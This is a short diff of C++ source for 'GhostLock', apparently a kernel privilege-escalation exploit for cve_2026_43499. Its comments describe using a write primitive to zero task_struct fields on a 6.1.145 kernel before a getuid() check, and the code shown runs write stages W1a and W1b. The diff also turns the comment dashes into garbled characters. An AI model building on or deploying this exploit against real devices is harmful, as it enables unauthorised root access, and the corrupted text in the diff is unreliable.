@@ -1,5 +1,5 @@
 /*
- * GhostLock — cve_2026_43499 backend procedure (Batch 4, D1=B).
+ * GhostLock 鈥?cve_2026_43499 backend procedure (Batch 4, D1=B).
  *
  * The setup stage, the W1-W3 step sequence and the shared write/retry
  * primitives moved out of the retired ExploitProcedure. The middleware policy
@@ -155,10 +155,10 @@ namespace ghostlock::session::backend {
          * strip the tag BEFORE W2 verify runs the child's getuid().
          *
          * This exploit primitive is 64-bit granular, so:
-         *   – task+0x00 (thread_info.flags) covers tag A at +0x06 and also
+         *   鈥?task+0x00 (thread_info.flags) covers tag A at +0x06 and also
          *     clears the syscall-tracepoint bit (0x400). This takes the task
          *     off the sys_exit slow-path immediately.
-         *   – tag B is at +0x2c. We align down to 8 bytes (0x28) and zero the
+         *   鈥?tag B is at +0x2c. We align down to 8 bytes (0x28) and zero the
          *     whole word. VERIFY ON-DEVICE that zeroing bytes 0x28-0x2f is
          *     safe on your 6.1.145 kernel; if not, comment out the tagB write.
          * ------------------------------------------------------------------ */
@@ -409,7 +409,8 @@ namespace ghostlock::session::backend {
                 }
                 support::run_state::complete("w1a");
                 support::run_state::enter("w1b");
-                if (!w1_scratch_repair<M>(session)) return StageResult::Failed;
+                if (!w1_scratch_repair<M>(session))
+                    return StageResult::Failed;
                 support::run_state::complete("w1b");
                 attack::timer_mark("Write 1 complete");
             } else {
